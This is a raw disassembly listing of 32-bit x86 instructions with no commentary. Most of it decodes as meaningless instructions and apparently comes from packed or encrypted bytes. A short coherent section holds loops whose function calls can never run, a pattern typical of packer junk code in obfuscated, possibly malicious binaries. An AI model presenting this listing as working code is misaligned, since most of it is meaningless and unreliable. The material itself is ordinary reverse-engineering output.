  40ab82:	out    dx,eax
  40ab83:	sub    DWORD PTR [esp+eiz*4-0x2fbc6387],ebp
  40ab8a:	xchg   edx,eax
  40ab8b:	mov    dl,0x2e
  40ab8d:	imul   ebp,edi,0xffffffac
  40ab90:	pop    esi
  40ab91:	lods   eax,DWORD PTR ds:[esi]
  40ab92:	jne    0x40abce
  40ab94:	or     al,0x69
  40ab96:	mov    dh,0xc3
  40ab98:	sub    ebp,DWORD PTR [bx+di+0x51]
  40ab9c:	aas    
  40ab9d:	jge    0x40ab72
  40ab9f:	and    bh,bl
  40aba1:	fstp   TBYTE PTR [ecx-0x1f]
  40aba4:	enter  0x6602,0x0
  40aba8:	pusha  
  40aba9:	fist   WORD PTR [eax-0x3702fd37]
  40abaf:	mov    eax,0xb7bd90d1
  40abb4:	call   0xfb7f:0xe5d2a99b
  40abbb:	pop    eax
  40abbc:	(bad)  
  40abbd:	repz pop ds
  40abbf:	ins    DWORD PTR es:[edi],dx
  40abc0:	jns    0x40ab49
  40abc2:	pop    esi
  40abc3:	mov    DWORD PTR [ebp+ebp*4+0x57],eax
  40abc7:	fsub   QWORD PTR [edi]
  40abc9:	xor    BYTE PTR [ecx-0x7d45c564],al
  40abcf:	push   ss
  40abd0:	nop
  40abd1:	icebp  
  40abd2:	(bad)  
  40abd4:	mov    eax,ds:0xd4050cee
  40abd9:	(bad)
  40abdc:	xchg   edi,eax
  40abdd:	sbb    bh,BYTE PTR [ecx+0x44]
  40abe0:	add    BYTE PTR [esi+0x33],dl
  40abe3:	les    ebp,FWORD PTR [edi]
  40abe5:	xchg   edi,eax
  40abe6:	cmp    eax,0x238aa784
  40abeb:	or     al,0xc3
  40abed:	repnz mov BYTE PTR [esi],bl
  40abf0:	push   ss
  40abf1:	sub    eax,0x93e5d94a
  40abf6:	jecxz  0x40ac67
  40abf8:	out    dx,eax
  40abf9:	xor    DWORD PTR [ecx+0x463796cb],ebp
  40abff:	dec    eax
  40ac00:	xor    eax,0xb4bd5b93
  40ac05:	daa    
  40ac06:	inc    esi
  40ac07:	xlat   BYTE PTR ds:[ebx]
  40ac08:	and    edx,DWORD PTR ss:[esi]
  40ac0b:	lods   al,BYTE PTR ds:[esi]
  40ac0c:	or     al,0x99
  40ac0e:	lahf   
  40ac0f:	aam    0xbc
  40ac11:	test   BYTE PTR [edx-0x65],dl
  40ac14:	fucomip st,st(0)
  40ac16:	stos   DWORD PTR es:[edi],eax
  40ac17:	sub    eax,0xd9a549e8
  40ac1c:	xchg   DWORD PTR [eax-0x78417083],ebx
  40ac22:	xchg   edi,eax
  40ac23:	mov    ebx,0xb25232b2
  40ac28:	scas   eax,DWORD PTR es:[edi]
  40ac29:	or     DWORD PTR [esi+0xd],ebp
  40ac2c:	retf   0xcb5e
  40ac2f:	xor    BYTE PTR [esi],0xf2
  40ac32:	dec    edi
  40ac33:	lea    ebp,[edx+0x18c5f7bf]
  40ac39:	xchg   ebx,eax
  40ac3a:	test   eax,0xbf3aa7b0
  40ac3f:	into   
  40ac40:	inc    ebx
  40ac41:	dec    ebp
  40ac42:	lea    ecx,[esi]
  40ac44:	dec    ebp
  40ac45:	dec    edx
  40ac46:	stos   BYTE PTR es:[edi],al
  40ac47:	xchg   esp,eax
  40ac48:	pop    ebp
  40ac49:	std    
  40ac4a:	mov    ds:0x83124567,al
  40ac4f:	inc    BYTE PTR [ecx]
  40ac51:	pop    es
  40ac52:	cs mov ebp,0x19a11a49
  40ac58:	push   ss
  40ac59:	mov    bh,0x68
  40ac5b:	arpl   WORD PTR [eax+0x599d2983],di
  40ac61:	pushf  
  40ac62:	sub    eax,0x858a3415
  40ac67:	push   ss
  40ac68:	or     ecx,DWORD PTR [ebp-0x5c]
  40ac6b:	xor    ah,ch
  40ac6d:	mov    bh,0x4f
  40ac6f:	pop    eax
  40ac70:	test   al,0xc
  40ac72:	inc    edx
  40ac73:	inc    esp
  40ac74:	mov    al,0x89
  40ac76:	push   edi
  40ac77:	xor    esi,eax
  40ac79:	into   
  40ac7a:	xchg   ebp,edx
  40ac7c:	rcl    bl,0x8d
  40ac7f:	sbb    eax,0x80f53fd0
  40ac84:	cli    
  40ac85:	imul   eax,DWORD PTR [ecx-0x5a],0x4d
  40ac89:	ja     0x40acd0
  40ac8b:	std    
  40ac8c:	test   al,dh
  40ac8e:	cmc    
  40ac8f:	jne    0x40ac84
  40ac91:	xor    eax,0x1d7b03ae
  40ac96:	add    ch,bl
  40ac98:	mov    al,ds:0xe41cd0a6
  40ac9d:	cli    
  40ac9e:	add    al,0x97
  40aca0:	cmp    esp,0x57
  40aca3:	dec    ebx
  40aca4:	xchg   esp,eax
  40aca5:	aaa    
  40aca6:	ins    DWORD PTR es:[edi],dx
  40aca7:	loope  0x40ac6a
  40aca9:	outs   dx,BYTE PTR ds:[esi]
  40acaa:	(bad)  
  40acab:	cwde   
  40acac:	sub    al,0x9d
  40acae:	ds call 0x604f:0xa7ff92e6
  40acb6:	adc    cl,BYTE PTR [ebp+0x56]
  40acb9:	mov    dh,0xea
  40acbb:	cmp    ebx,edi
  40acbd:	or     BYTE PTR [esi-0x20968f5c],0xf1
  40acc4:	or     DWORD PTR ds:0xaad817c5,0x989e866f
  40acce:	push   es
  40accf:	stos   DWORD PTR es:[edi],eax
  40acd0:	xor    edi,esi
  40acd2:	mov    eax,ds:0xd43f1fa9
  40acd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acd8:	mov    bl,0xbd
  40acda:	push   ds
  40acdb:	add    DWORD PTR [esi],edx
  40acdd:	or     DWORD PTR [edi+0x7],edx
  40ace0:	xchg   ecx,eax
  40ace1:	rep lods al,BYTE PTR ds:[esi]
  40ace3:	and    eax,0x15c3533e
  40ace8:	shl    dh,0x89
  40aceb:	pop    ecx
  40acec:	arpl   WORD PTR [edx+eax*2],si
  40acef:	fs pop esi
  40acf1:	stc    
  40acf2:	mov    cl,BYTE PTR [esi]
  40acf4:	fld    TBYTE PTR ds:0x789292d3
  40acfa:	inc    edx
  40acfb:	add    al,0xf3
  40acfd:	js     0x40ad58
  40acff:	pop    eax
  40ad00:	je     0x40acd6
  40ad02:	mov    ah,0xec
  40ad04:	mov    eax,ds:0x856ec4b1
  40ad09:	xor    al,0xd2
  40ad0b:	test   eax,0xc7d1c9d9
  40ad10:	ss jns 0x40ad00
  40ad13:	rcl    al,0x10
  40ad16:	xor    al,BYTE PTR [esi-0x18d3f223]
  40ad1c:	inc    ecx
  40ad1d:	sti    
  40ad1e:	out    0x15,al
  40ad20:	push   0x51182a94
  40ad25:	dec    ecx
  40ad26:	shl    eax,1
  40ad28:	lods   eax,DWORD PTR ds:[esi]
  40ad29:	jae    0x40acce
  40ad2b:	push   ds
  40ad2c:	aaa    
  40ad2d:	cmp    BYTE PTR [ecx],0x92
  40ad30:	adc    DWORD PTR [ecx],edx
  40ad32:	inc    ebp
  40ad33:	and    BYTE PTR [edx+0x46],ah
  40ad36:	adc    eax,ecx
  40ad38:	pop    ecx
  40ad39:	(bad)  
  40ad3a:	sti    
  40ad3b:	loopne 0x40ada9
  40ad3d:	cmc    
  40ad3e:	pop    esi
  40ad3f:	in     al,0xda
  40ad41:	adc    al,0x7e
  40ad43:	clc    
  40ad44:	clc    
  40ad45:	add    eax,0x884841e9
  40ad4a:	xor    bl,BYTE PTR [ebx-0x37d130b8]
  40ad50:	mov    esp,0x611d74f0
  40ad55:	mov    eax,0xde80c6d3
  40ad5a:	xchg   ebp,eax
  40ad5b:	int3   
  40ad5c:	adc    BYTE PTR [ecx+eax*1],dl
  40ad5f:	dec    edi
  40ad60:	adc    eax,0x58c7b78a
  40ad65:	or     eax,DWORD PTR [ebx+ecx*4]
  40ad68:	mov    cl,0xf1
  40ad6a:	fld    QWORD PTR [edx-0x6f]
  40ad6d:	jne    0x40ad3d
  40ad6f:	mov    bl,BYTE PTR [edi+0x3d7501b3]
  40ad75:	xlat   BYTE PTR ds:[ebx]
  40ad76:	inc    esi
  40ad77:	into   
  40ad78:	sub    BYTE PTR [edi+esi*1],dh
  40ad7b:	pop    edx
  40ad7c:	xchg   esi,eax
  40ad7d:	jmp    0x482e8bfc
  40ad82:	cwde   
  40ad83:	stos   DWORD PTR es:[edi],eax
  40ad84:	outs   dx,DWORD PTR ds:[esi]
  40ad85:	jmp    0xb6c7:0x4aa95630
  40ad8c:	mov    dl,0xaf
  40ad8e:	jnp    0x40ad73
  40ad90:	push   ecx
  40ad91:	jnp    0x40ada5
  40ad93:	or     al,0x7a
  40ad95:	hlt    
  40ad96:	mov    edx,0xaa8fdc53
  40ad9b:	sti    
  40ad9c:	sbb    al,0x9c
  40ad9e:	cmp    dl,BYTE PTR [ecx]
  40ada0:	aam    0xdf
  40ada2:	in     eax,dx
  40ada3:	cmp    eax,0x1df3f61d
  40ada8:	push   ecx
  40ada9:	leave  
  40adaa:	sub    edx,DWORD PTR [eax+eiz*1]
  40adad:	stos   BYTE PTR es:[edi],al
  40adae:	scas   eax,DWORD PTR es:[edi]
  40adaf:	cmp    DWORD PTR [edi-0x6a5a1bf2],esi
  40adb5:	or     DWORD PTR [esi],edi
  40adb7:	fs ins BYTE PTR es:[edi],dx
  40adb9:	adc    ebp,DWORD PTR [ebp-0x19]
  40adbc:	dec    esp
  40adbd:	push   ds
  40adbe:	mov    ecx,0x3f380ad4
  40adc3:	mov    ds,WORD PTR ds:0xe15679e7
  40adc9:	cmp    al,0xa9
  40adcb:	dec    ebx
  40adcc:	push   es
  40adcd:	into   
  40adce:	jecxz  0x40ada7
  40add0:	xor    edx,0xffffffa6
  40add3:	mov    ss,ecx
  40add5:	lods   al,BYTE PTR ds:[esi]
  40add6:	mov    WORD PTR [esi+0x5c],?
  40add9:	mov    cl,0x59
  40addb:	or     eax,0xf685b698
  40ade0:	jnp    0x40adaa
  40ade2:	mov    al,0x84
  40ade4:	mov    ecx,0xac53e413
  40ade9:	pop    esp
  40adea:	pop    eax
  40adeb:	dec    edi
  40adec:	pop    esp
  40aded:	outs   dx,DWORD PTR ds:[esi]
  40adee:	out    dx,eax
  40adef:	sub    BYTE PTR [edi-0x44],ch
  40adf2:	cmp    edx,DWORD PTR [eax-0x6c]
  40adf5:	push   cs
  40adf6:	dec    esp
  40adf7:	jbe    0x40ad9b
  40adf9:	push   ecx
  40adfa:	cmc    
  40adfb:	mov    ecx,0x7f29085c
  40ae00:	sub    eax,0x76a59f9
  40ae05:	mov    ss,WORD PTR [esi+0x1a3c5c22]
  40ae0b:	xchg   DWORD PTR [ebp+0x53],ecx
  40ae0e:	xor    al,0x15
  40ae10:	push   0x4b
  40ae12:	mov    bl,0xb2
  40ae14:	inc    esp
  40ae15:	inc    edx
  40ae16:	and    DWORD PTR [edi+eax*4-0x25c47c36],ecx
  40ae1d:	xor    al,0x48
  40ae1f:	jl     0x40adb1
  40ae21:	fs dec eax
  40ae23:	push   edx
  40ae24:	fidivr WORD PTR [edx-0x6f254256]
  40ae2a:	mov    bl,dh
  40ae2c:	pop    esi
  40ae2d:	pop    eax
  40ae2e:	pop    es
  40ae2f:	outs   dx,BYTE PTR ds:[esi]
  40ae30:	in     al,0x3f
  40ae32:	xchg   ebx,eax
  40ae33:	fwait
  40ae34:	pop    es
  40ae35:	add    BYTE PTR [edx],cl
  40ae37:	add    BYTE PTR [ebp-0x3e],bh
  40ae3a:	mov    edi,0xd914a3e
  40ae3f:	imul   esi,DWORD PTR [ebx-0x6cfd62de],0xffffffc0
  40ae46:	xor    DWORD PTR [eax-0x39],ebx
  40ae49:	pusha  
  40ae4a:	aas    
  40ae4b:	sahf   
  40ae4c:	mov    cl,0x28
  40ae4e:	xchg   ah,dh
  40ae50:	fiadd  DWORD PTR [eax]
  40ae52:	dec    eax
  40ae53:	lock aad 0xb2
  40ae56:	inc    esp
  40ae57:	je     0x40ae6b
  40ae59:	loop   0x40ae13
  40ae5b:	int3   
  40ae5c:	dec    ebp
  40ae5d:	fcom   DWORD PTR [eax+0x633e9afe]
  40ae63:	retf   0x495b
  40ae66:	aad    0x35
  40ae68:	iret   
  40ae69:	inc    edi
  40ae6a:	mov    ah,0xfc
  40ae6c:	and    eax,0x91e4e83e
  40ae71:	lods   eax,DWORD PTR ds:[esi]
  40ae72:	ret    
  40ae73:	outs   dx,DWORD PTR ds:[esi]
  40ae74:	mov    ecx,0xbb528324
  40ae79:	push   ss
  40ae7a:	cdq    
  40ae7b:	clc    
  40ae7c:	xchg   dl,cl
  40ae7e:	or     cl,ch
  40ae80:	repz push ss
  40ae82:	stc    
  40ae83:	sbb    eax,0xa063d40a
  40ae88:	fcomp  QWORD PTR [ecx+ecx*8]
  40ae8b:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40ae8d:	mov    ds:0x33ec524a,al
  40ae92:	mov    al,ds:0x4387c35c
  40ae97:	cmp    DWORD PTR [edx],ebp
  40ae99:	cmp    esi,0xffffff97
  40ae9c:	adc    cl,cl
  40ae9e:	mov    al,0x76
  40aea0:	mov    ds:0xd18434d4,eax
  40aea5:	jo     0x40aefc
  40aea7:	je     0x40af0f
  40aea9:	sub    DWORD PTR [esi-0x1d],ebp
  40aeac:	inc    esp
  40aead:	int3   
  40aeae:	retf   
  40aeaf:	push   ss
  40aeb0:	mov    dl,0x17
  40aeb2:	mov    al,0xaf
  40aeb4:	or     BYTE PTR [ecx],dh
  40aeb6:	mov    edi,esi
  40aeb8:	movhps xmm6,QWORD PTR [esi+0x1aba9e93]
  40aebf:	cwde   
  40aec0:	or     edx,edi
  40aec2:	or     DWORD PTR [ecx+0x12],eax
  40aec5:	int    0xa6
  40aec7:	or     esp,DWORD PTR [esi]
  40aec9:	sub    eax,0xe7f1b1ec
  40aece:	fisttp DWORD PTR [eax]
  40aed0:	add    edx,ecx
  40aed2:	imul   edx,edi
  40aed5:	xor    ebx,DWORD PTR ds:0x434553
  40aedb:	mov    edi,DWORD PTR [ebp-0x8]
  40aede:	mov    ebx,DWORD PTR [ebp-0x10]
  40aee1:	xor    DWORD PTR ds:0x434547,0x7c2a
  40aeeb:	sub    ebx,edi
  40aeed:	mov    DWORD PTR ds:0x43453f,0x592f
  40aef7:	cmp    ebx,edx
  40aef9:	mov    DWORD PTR ds:0x4345ff,0x4e0a
  40af03:	ja     0x40af21
  40af09:	mov    DWORD PTR ds:0x43458f,ebx
  40af0f:	mov    edx,DWORD PTR [ebp-0x28]
  40af12:	mov    DWORD PTR ds:0x4344ef,0x4d1d
  40af1c:	jmp    0x40bcba
  40af21:	sub    DWORD PTR ds:0x43453b,ebx
  40af27:	mov    edx,DWORD PTR [ebp-0x30]
  40af2a:	add    edi,edi
  40af2c:	mov    edi,DWORD PTR [ebp-0x4]
  40af2f:	and    DWORD PTR ds:0x434547,0x0
  40af39:	jmp    0x40af4d
  40af3e:	xor    ebx,ebx
  40af40:	or     ebx,DWORD PTR ds:0x434547
  40af46:	inc    ebx
  40af47:	mov    DWORD PTR ds:0x434547,ebx
  40af4d:	cmp    DWORD PTR ds:0x434547,0x1a
  40af54:	jae    0x40af87
  40af5a:	cmp    DWORD PTR ds:0x434547,0x22
  40af61:	jne    0x40af82
  40af67:	push   0x434577
  40af6c:	push   DWORD PTR [ebp-0x28]
  40af6f:	push   0x43458b
  40af74:	push   0x42d8
  40af79:	push   DWORD PTR [ebp-0x24]
  40af7c:	call   DWORD PTR ds:0x4130c4
  40af82:	jmp    0x40af3e
  40af87:	xor    edx,eax
  40af89:	xor    ebx,0x22d8
  40af8f:	xor    edi,eax
  40af91:	add    edi,ecx
  40af93:	and    DWORD PTR ds:0x434613,0x0
  40af9d:	mov    ebx,DWORD PTR ds:0x434613
  40afa3:	inc    ebx
  40afa4:	mov    DWORD PTR ds:0x434613,ebx
  40afaa:	cmp    DWORD PTR ds:0x434613,0x23
  40afb1:	jne    0x40afd2
  40afb7:	push   DWORD PTR [ebp-0x10]
  40afba:	push   DWORD PTR [ebp-0x18]
  40afbd:	push   0x635c
  40afc2:	push   0x3675
  40afc7:	push   0x36d2
  40afcc:	call   DWORD PTR ds:0x413290
  40afd2:	cmp    DWORD PTR ds:0x434613,0x14
  40afd9:	jb     0x40af9d
  40afdf:	add    edx,ecx
  40afe1:	imul   edx,edi
  40afe4:	mov    edi,DWORD PTR [ebp-0x8]
  40afe7:	mov    ebx,DWORD PTR [ebp-0x10]
  40afea:	jmp    0x40b401
  40afef:	aas    
  40aff0:	and    DWORD PTR [eax],0xefb16010
  40aff6:	push   ecx
  40aff7:	repnz test al,0x23
  40affa:	pusha  
  40affb:	cs (bad) 
  40affd:	cmp    al,0x72
  40afff:	idiv   dl
  40b001:	jle    0x40b081
  40b003:	jo     0x40b07e
  40b005:	jle    0x40b085
  40b007:	pop    ebp
  40b008:	dec    eax
  40b009:	cmp    DWORD PTR [eax+0x69],edx
  40b00c:	clc    
  40b00d:	pop    ebx
  40b00e:	push   cs
  40b00f:	ret    
  40b010:	add    cl,dl
  40b012:	mov    ah,0xd1
  40b014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b015:	push   ds
  40b016:	jbe    0x40b000
  40b018:	pop    ecx
  40b019:	test   eax,0x1de0fd57
  40b01e:	retf   
  40b01f:	lods   eax,DWORD PTR ds:[esi]
  40b020:	stc    
  40b021:	ins    DWORD PTR es:[edi],dx
  40b022:	fs cdq 
  40b024:	sub    eax,0xf680071a
  40b029:	test   ah,cl
  40b02b:	push   0x12
  40b02d:	loop   0x40b039
  40b02f:	(bad)  
  40b030:	int    0x30
  40b032:	dec    edx
  40b033:	jns    0x40b059
  40b035:	loopne 0x40afd6
  40b037:	cmp    ebp,ebx
  40b039:	xor    DWORD PTR [edx],edi
  40b03b:	sub    dh,BYTE PTR [esi-0x21]
  40b03e:	ins    DWORD PTR es:[edi],dx
  40b03f:	mov    dl,0x7c
  40b041:	clc    
  40b042:	out    0x36,eax
  40b044:	push   ss
  40b045:	xor    al,dl
  40b047:	adc    al,0x7f
  40b049:	push   edi
  40b04a:	sub    BYTE PTR ds:0x5cb862f4,0xe2
  40b051:	mov    ebp,0x4dc36996
  40b056:	bound  ecx,QWORD PTR [esi-0x28]
  40b059:	xor    BYTE PTR [eax-0x62d3797c],dl
  40b05f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b060:	stc    
  40b061:	fadd   st(1),st
  40b063:	(bad)  
  40b064:	xchg   DWORD PTR [di],ebp
  40b067:	xchg   BYTE PTR [edx+0x149c5e8a],dl
  40b06d:	cld    
  40b06e:	lds    ecx,FWORD PTR [ebx]
  40b070:	push   edi
  40b071:	aas    
  40b072:	(bad)  
  40b073:	jmp    0x40b05a
  40b075:	mov    ecx,0x869c5cbb
  40b07a:	or     cl,BYTE PTR [edi+0x52]
  40b07d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b07e:	mov    al,0xb0
  40b080:	jmp    0x7f0c:0x9458ab46
  40b087:	not    DWORD PTR [edx+0x701eb4f0]
  40b08d:	push   ds
  40b08e:	mov    edi,0x47d0a4d4
  40b093:	lods   al,BYTE PTR ds:[esi]
  40b094:	inc    ecx
  40b095:	cmp    al,0xf0
  40b097:	inc    edx
  40b098:	and    BYTE PTR [ecx+0x26baf93c],ch
  40b09e:	mov    esi,0xe1920dfc
  40b0a3:	push   esp
  40b0a4:	sbb    DWORD PTR [eax],ebp
  40b0a6:	int3   
  40b0a7:	pop    ebx
  40b0a8:	dec    ebp
  40b0a9:	add    eax,0x61b71616
  40b0ae:	xchg   ebx,eax
  40b0af:	aad    0x5c
  40b0b1:	rcr    BYTE PTR ds:0xdb32dcd4,cl
  40b0b7:	mov    bh,0xd7
  40b0b9:	call   0x5a5a:0x4f0f7e3
  40b0c0:	push   esp
  40b0c1:	out    dx,al
  40b0c2:	rcl    DWORD PTR [edi-0x33],1
  40b0c5:	inc    ebp
  40b0c6:	xchg   esi,eax
  40b0c7:	push   esi
  40b0c8:	mov    dl,0x5e
  40b0ca:	inc    ebp
  40b0cb:	mov    bh,0x3c
  40b0cd:	mov    ds:0xc7d771c6,al
  40b0d2:	scas   al,BYTE PTR es:[edi]
  40b0d3:	adc    bh,dl
  40b0d5:	out    dx,eax
  40b0d6:	xchg   ebx,edi
  40b0d8:	mov    ds:0xfcff76cd,eax
  40b0dd:	aas    
  40b0de:	cli    
  40b0df:	addr16 pop es
  40b0e1:	jecxz  0x40b10f
  40b0e3:	lods   eax,DWORD PTR ds:[esi]
  40b0e4:	fwait
  40b0e5:	out    dx,eax
  40b0e6:	mov    ah,0x16
  40b0e8:	pop    ebx
  40b0e9:	pop    esp
  40b0ea:	add    eax,0x9759c198
  40b0ef:	aaa    
  40b0f0:	dec    edx
  40b0f1:	adc    cl,BYTE PTR [ecx-0x52b594c4]
  40b0f7:	jp     0x40b0d6
  40b0f9:	cs add al,0x93
  40b0fc:	stos   DWORD PTR es:[edi],eax
  40b0fd:	or     eax,0xe408fe54
  40b102:	mov    esp,0x4d31eada
  40b107:	(bad)  
  40b108:	xor    BYTE PTR [ebp-0x14f2c769],bl
  40b10e:	sub    ecx,DWORD PTR [edi]
  40b110:	pop    es
  40b111:	adc    al,0x79
  40b113:	or     DWORD PTR ds:0xa70b7e9a,0x70
  40b11a:	xor    dl,dh
  40b11c:	inc    edi
  40b11d:	es aas 
  40b11f:	or     al,0xbc
  40b121:	test   eax,0x449f195c
  40b126:	push   ss
  40b127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b128:	push   es
  40b129:	cmp    BYTE PTR [ebp-0x33],al
  40b12c:	cmp    al,0x96
  40b12e:	pushf  
  40b12f:	(bad)  
  40b130:	jge    0x40b14e
  40b132:	jg     0x40b0eb
  40b134:	daa    
  40b135:	cld    
  40b136:	dec    esi
  40b137:	cmc    
  40b138:	jns    0x40b11b
  40b13a:	push   DWORD PTR [ecx-0x56e760c9]
  40b140:	je     0x40b14f
  40b142:	lahf   
  40b143:	sbb    BYTE PTR [ebp-0x7c],0x43
  40b147:	push   eax
  40b148:	or     esp,DWORD PTR [eax]
  40b14a:	sbb    al,0x34
  40b14c:	inc    ebx
  40b14d:	call   FWORD PTR [esi-0xb]
  40b150:	fs mov ebx,0x8b9ae793
  40b156:	xor    DWORD PTR [ebp+ecx*8-0xe],edi
  40b15a:	ror    DWORD PTR [eax+0x55],1
  40b15d:	or     dh,BYTE PTR [edx+0x5c7b05a9]
  40b163:	push   esi
  40b164:	jg     0x40b140
  40b166:	out    0xf2,al
  40b168:	push   esp
  40b169:	or     eax,0x3fdf3c58
  40b16e:	inc    esp
  40b16f:	gs push eax
  40b171:	in     al,dx
  40b172:	xchg   esi,eax
  40b173:	sbb    bl,cl
  40b175:	js     0x40b172
  40b177:	sbb    DWORD PTR [edx],edi
  40b179:	imul   ecx,DWORD PTR [ebp-0x684ec2],0xa9a86c14
  40b183:	mov    bh,0xaa
  40b185:	dec    ebx
  40b186:	mov    ch,dh
  40b188:	adc    eax,edx
  40b18a:	imul   ecx,DWORD PTR [ecx+0xf],0x57935e1a
  40b191:	jmp    0x8f25:0xe37b0232
  40b198:	js     0x40b147
  40b19a:	call   esp
  40b19c:	enter  0xda28,0xc1
  40b1a0:	ins    DWORD PTR es:[edi],dx
  40b1a1:	xor    DWORD PTR [ecx],ebp
  40b1a3:	jmp    0x9e33e055
  40b1a8:	fmul   DWORD PTR [edx]
  40b1aa:	es inc esp
  40b1ac:	or     al,dh
  40b1ae:	push   ecx
  40b1af:	jecxz  0x40b1a3
  40b1b1:	xchg   ebx,eax
  40b1b2:	sbb    DWORD PTR [ecx+eax*8+0x2c],edx
  40b1b6:	int3   
  40b1b7:	xor    dl,BYTE PTR ds:0x33494f20
  40b1bd:	cli    
  40b1be:	add    al,0xab
  40b1c0:	in     al,0x8e
  40b1c2:	sbb    eax,0x6845cc17
  40b1c7:	fiadd  DWORD PTR [ecx-0x20]
  40b1ca:	cdq    
  40b1cb:	js     0x40b1f9
  40b1cd:	into   
  40b1ce:	push   0xffffffa0
  40b1d0:	nop
  40b1d1:	les    ebx,FWORD PTR [edi]
  40b1d3:	sbb    al,0xba
  40b1d5:	xchg   ecx,eax
  40b1d6:	inc    edi
  40b1d7:	mov    esp,0x2440c160
  40b1dc:	stos   DWORD PTR es:[edi],eax
  40b1dd:	cmc    
  40b1de:	push   ebx
  40b1df:	cmp    al,0x45
  40b1e1:	cmc    
  40b1e2:	out    0x91,al
  40b1e4:	push   esp
  40b1e5:	out    dx,al
  40b1e6:	cmp    al,0x72
  40b1e8:	or     BYTE PTR [ebx],ch
  40b1ea:	xor    DWORD PTR [ebx-0x17171c9d],0xffffffa6
  40b1f1:	lahf   
  40b1f2:	cmp    bh,ch
  40b1f4:	or     al,0x80
  40b1f6:	(bad)  [esi+0x33]
  40b1f9:	pop    ds
  40b1fa:	mov    DWORD PTR [edi+esi*4],0x255212d7
  40b201:	mov    esp,edi
  40b203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b204:	test   BYTE PTR [ebx-0x54990740],dh
  40b20a:	mov    eax,ds:0x981700a8
  40b20f:	and    DWORD PTR [ecx-0x79],eax
  40b212:	(bad)  
  40b213:	mov    ecx,DWORD PTR [esi]
  40b215:	or     DWORD PTR [edi+ebp*1+0x46],ebp
  40b219:	xchg   ecx,eax
  40b21a:	test   eax,0xd8cf8e0e
  40b21f:	iret   
  40b220:	mov    al,ds:0x629c8a34
  40b225:	push   esi
  40b226:	sbb    esi,DWORD PTR [ecx+0x47]
  40b229:	jp     0x40b26b
  40b22b:	sar    BYTE PTR [ebx],0x1
  40b22e:	mov    ebx,0x4bf630c7
  40b233:	inc    ebx
  40b234:	aad    0x90
  40b236:	in     al,0xb4
  40b238:	add    ebp,DWORD PTR [ebx+0x541bef12]
  40b23e:	dec    esi
  40b23f:	add    dh,BYTE PTR [ecx+0x23549b06]
  40b245:	jmp    DWORD PTR [esi+0x62]
  40b248:	jae    0x40b22b
  40b24a:	xor    eax,0xe4f61bea
  40b24f:	mov    bh,0x58
  40b251:	push   ecx
  40b252:	dec    ebx
  40b253:	outs   dx,BYTE PTR ds:[esi]
  40b254:	pop    edi
  40b255:	add    DWORD PTR [edi+0x858fab0],edi
  40b25b:	xchg   BYTE PTR [edx-0x59631aab],dl
  40b261:	into   
  40b262:	repz sbb al,0x68
  40b265:	test   BYTE PTR ds:0x41bb8bad,al
  40b26b:	xchg   esp,eax
  40b26c:	test   BYTE PTR [ecx],dl
  40b26e:	push   edi
  40b26f:	cmp    esi,ebp
  40b271:	in     al,dx
  40b272:	shr    DWORD PTR [edi-0x23],1
  40b275:	or     BYTE PTR [ecx-0x42],cl
  40b278:	push   edx
  40b279:	dec    eax
  40b27a:	or     DWORD PTR [edi+0xa],ecx
  40b27d:	pop    edx
  40b27e:	or     DWORD PTR es:[edi+0x677f474e],edx
  40b285:	outs   dx,DWORD PTR ds:[esi]
  40b286:	in     eax,0xb0
  40b288:	or     edx,esp
  40b28a:	pop    ebp
  40b28b:	lock sub DWORD PTR [esi+0x5f],eax
  40b28f:	add    al,0x7c
  40b291:	dec    ebx
  40b292:	scas   eax,DWORD PTR es:[edi]
  40b293:	inc    edx
  40b294:	xchg   esi,eax
  40b295:	or     edi,esp
  40b297:	in     al,dx
  40b298:	test   eax,0x74a0afdc
  40b29d:	cmp    eax,0xace980c0
  40b2a2:	xchg   ecx,eax
  40b2a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2a4:	or     DWORD PTR [esi],edx
  40b2a6:	sbb    eax,0xa556403f
  40b2ab:	out    0x51,al
  40b2ad:	test   DWORD PTR [ebx],ebp
  40b2af:	adc    DWORD PTR [ecx-0x52871667],esi
  40b2b5:	clc    
  40b2b6:	push   cs
  40b2b7:	cmp    bh,0xaf
  40b2ba:	retf   0x5eeb
  40b2bd:	adc    al,cl
  40b2bf:	cs leave 
  40b2c1:	mov    ebp,0x6880c550
  40b2c6:	pusha  
  40b2c7:	mov    bl,0xee
  40b2c9:	mov    ds:0xaf2455c5,al
  40b2ce:	outs   dx,DWORD PTR ds:[esi]
  40b2cf:	jp     0x40b253
  40b2d1:	out    0x6,eax
  40b2d3:	pushf  
  40b2d4:	imul   ebx,DWORD PTR ds:0xd4063252,0x79
  40b2db:	loope  0x40b350
  40b2dd:	std    
  40b2de:	shl    DWORD PTR ds:0x193750e9,cl
  40b2e4:	mov    esp,0xf687279d
  40b2e9:	xchg   edi,eax
  40b2ea:	xor    BYTE PTR [ebp-0x7b],ch
  40b2ed:	fld    QWORD PTR [eax+0x45fd0360]
  40b2f3:	mov    al,ds:0x6623526a
  40b2f8:	cmp    eax,DWORD PTR [edi-0x329a8b26]
  40b2fe:	call   0xbf11:0xa6c6e49b
  40b305:	lea    esi,[ecx-0x14]
  40b308:	retf   
  40b309:	(bad)  
  40b30a:	push   ds
  40b30b:	or     al,0x13
  40b30d:	sahf   
  40b30e:	add    al,0xbe
  40b310:	adc    dh,BYTE PTR [ebx+0x68]
  40b313:	clc    
  40b314:	pop    edx
  40b315:	iret   
  40b316:	test   DWORD PTR ds:0x2606db0c,eax
  40b31d:	popa   
  40b31e:	cmp    al,0x1f
  40b320:	push   ecx
  40b321:	sub    DWORD PTR [esi+0x4c89fd44],0xffffffd6
  40b328:	and    al,0xe4
  40b32a:	mov    ecx,0xa78e23b8
  40b32f:	xchg   esi,eax
  40b330:	rcl    ebp,cl
  40b332:	shr    BYTE PTR [ebp-0x59fa301d],1
  40b338:	sti    
  40b339:	js     0x40b3a4
  40b33b:	sbb    BYTE PTR [ebx+ebx*4+0x4e],0xbd
  40b340:	les    ebx,FWORD PTR [ecx-0x3f]
  40b343:	ds jne 0x40b352
  40b346:	xchg   ebx,eax
  40b347:	arpl   WORD PTR [esi-0xd2112a4],sp
